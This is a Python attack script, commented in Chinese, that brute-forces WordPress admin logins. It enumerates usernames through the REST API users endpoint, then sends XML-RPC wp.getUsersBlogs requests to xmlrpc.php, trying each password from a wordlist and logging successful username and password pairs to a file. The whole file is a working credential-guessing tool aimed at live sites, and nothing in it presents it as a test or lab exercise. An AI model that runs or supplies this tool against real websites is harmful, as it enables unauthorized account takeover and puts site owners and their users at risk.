# -*- coding: UTF-8 -*-
import requests
import re
import time
import sys
import argparse
import json
import code_rprint as rprint
import datetime

paraPWD = []
userlist = []
global uri
success_file = open('success.txt','a+')

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
}

def get_time():
  return datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")

# 从接口获取用户名
def auto_getuser(parameter1,session,uri):
    get_uri = session.get(parameter1+uri,headers=headers).text
    json_get_uri = json.loads(get_uri)
    for l in range(0,len(json_get_uri)):
        name = json_get_uri[l]['name']
        rprint.info(get_time(),'/wp/v2/users/->'+str(name))
        userlist.append(name)
    return userlist

# 主函数 调用其他函数
def main(parameter1,session,uri,userlist_auto):
    num = 0
    cn_parse_error = "用户名或密码不正确"
    en_parse_error = "parse error. not well formed"
    page_404 = "404 Not Found"
    success_page = "param"

    if userlist_auto:
        auto_getuser(parameter1,session,uri)

    # 对userlist的用户逐个爆破
    for n in userlist:
        n = str(n)
        for password in paraPWD:
            postData = '''<?xml version="1.0" encoding="iso-8859-1"?><methodCall>  
            <methodName>wp.getUsersBlogs</methodName>
            <params>   
            <param><value>{}</value></param>   
            <param><value>{}</value></param>  
            </params>
            </methodCall>
            '''.format(n,password.decode('utf-8'))
            
            result = session.post(parameter1+'/xmlrpc.php',data=postData.encode('UTF-8'),headers=headers).text
            if success_page in result:
                rprint.info(get_time(),'[+] 爆破成功 '+n+' '+password.decode('utf-8'))
                success_file.write('[+] 爆破成功 '+n+' '+password.decode('utf-8')+'\n')
                break
            else:
                num = num + 1
                rprint.info(get_time(),"[-] username:"+n+" password:"+password.decode('utf-8'))

        rprint.info(get_time(),'用户'+n+'爆破任务结束，共累计爆破'+str(num+1)+'次')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPrees wp-admin爆破")
    parser.add_argument('-u','--u', type=str, help="target url")
    parser.add_argument('-auto','--auto', action='store_true', help="auto get username")
    parser.add_argument('-pwd','--pwd', type=str, help="password file path")
    parser.add_argument('-user','--user', type=str, help="username file path")
    args = parser.parse_args()

    

    try:
        if '-auto' in sys.argv:
            parameter1 = args.u
            parameter2 = args.pwd
            userlist_auto = True

            session = requests.session()

            get_uri = session.get(parameter1+'/?rest_route=/wp/v2/users/',headers=headers).text
            if ("description" in get_uri) and ("is_super_admin" in get_uri):
                uri = '/wp-json/wp/v2/users/'
            else:
                uri = '/?rest_route=/wp/v2/users/'

            with open(parameter2,'r',encoding='utf-8') as f:
                lines = f.readlines()
                paraPWD = [pwd.replace('\n','').encode('utf-8') for pwd in lines]
            main(parameter1,session,uri,userlist_auto)
        elif '-user' in sys.argv:
            parameter1 = args.u
            parameter2 = args.user
            parameter3 = args.pwd
            userlist_auto = False

            session = requests.session()

            get_uri = session.get(parameter1+'/?rest_route=/wp/v2/users/',headers=headers).text
            if "name" in get_uri:
                uri = '/?rest_route=/wp/v2/users/'
            else:
                uri = '/wp-json/wp/v2/users/'

            with open(parameter2,'r') as f:
                lines = f.readlines()
                userlist = [name.replace('\n','').encode('utf-8') for name in lines]
            with open(parameter3,'r',encoding='utf-8') as f:
                lines = f.readlines()
                paraPWD = [pwd.replace('\n','').encode('utf-8') for pwd in lines]
            main(parameter1,session,uri,userlist_auto)
        else:
          parser.print_help()
    except:
        pass

